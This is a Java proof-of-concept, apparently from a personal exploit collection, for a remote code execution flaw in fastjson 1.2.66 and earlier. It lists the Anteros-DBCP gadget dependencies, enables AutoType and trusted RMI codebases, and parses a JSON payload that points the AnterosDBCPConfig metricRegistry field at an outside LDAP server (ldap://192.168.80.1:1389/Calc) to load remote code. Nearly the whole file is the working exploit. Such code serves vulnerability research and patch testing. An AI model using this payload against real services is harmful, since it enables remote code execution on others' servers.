package com.ja0k.bug.fastjson.rce;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * /**
 *  * fastjson <= 1.2.66 RCE，需要开启AutoType
 *  *
 *  Anteros-DBCP依赖的gadget
 *  *
 *  *     <dependency>
 *  *       <groupId>com.codahale.metrics</groupId>
 *  *       <artifactId>metrics-healthchecks</artifactId>
 *  *       <version>3.0.2</version>
 *  *     </dependency>
 *  *
 *  *     <dependency>
 *  *       <groupId>br.com.anteros</groupId>
 *  *       <artifactId>Anteros-Core</artifactId>
 *  *       <version>1.2.1</version>
 *  *     </dependency>
 *  *
 *  *     <dependency>
 *  *       <groupId>br.com.anteros</groupId>
 *  *       <artifactId>Anteros-DBCP</artifactId>
 *  *       <version>1.0.1</version>
 *  *     </dependency>
 *  *
 *  *
 * @author ja0k
 */

public class AnterosDBCPConfig_metricRegistry {
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        String payload = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://192.168.80.1:1389/Calc\"}";
        try {
            JSON.parseObject(payload);
        }catch (Exception e){
            e.printStackTrace();
        }

    }
}
